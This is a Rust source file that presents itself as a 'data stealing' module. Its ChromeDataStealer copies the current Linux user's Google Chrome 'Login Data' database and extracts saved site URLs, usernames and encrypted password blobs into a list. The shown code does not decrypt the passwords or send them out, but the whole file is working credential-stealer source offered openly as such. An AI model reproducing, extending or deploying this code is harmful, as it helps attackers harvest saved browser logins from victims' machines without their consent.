/**
 * Module contains classes that implement data stealing algorithms.
 * Such algorithms steal credentials from database and depends on browser.
 *
 * Max A.Jurankov (astronmax) 2022
 */
use rusqlite::Connection;
use whoami;

// C-like simple structure for stealed credentials
pub struct Data {
    pub url: String,
    pub login: String,
    pub password: Vec<u8>,
}

// Data stealer interface
pub trait DataStealer {
    fn get_data(&self, res: &mut Vec<Data>);
}

// Google Chrome data stealer (needs to know path to login data)
pub struct ChromeDataStealer {
    linux_path: String,
}

impl ChromeDataStealer {
    pub fn new() -> Self {
        ChromeDataStealer {
            linux_path: format!(
                "/home/{}/.config/google-chrome/Default/Login Data",
                whoami::username()
            ),
        }
    }
}

impl DataStealer for ChromeDataStealer {
    // Method to get data from Google Chrome
    fn get_data(&self, res: &mut Vec<Data>) {
        std::fs::copy(self.linux_path.as_str(), "tmp.db").unwrap();
        let sql = "SELECT origin_url, username_value, password_value FROM logins;";

        let conn = Connection::open("tmp.db").unwrap();
        let mut stmt = conn.prepare(sql).unwrap();
        let mut rows = stmt.query([]).unwrap();

        while let Some(row) = rows.next().unwrap() {
            let password: Vec<u8> = row.get(2).unwrap();
            if !password.is_empty() {
                res.push(Data {
                    url: row.get(0).unwrap(),
                    login: row.get(1).unwrap(),
                    password: password,
                });
            }
        }

        std::fs::remove_file("tmp.db").unwrap();
    }
}
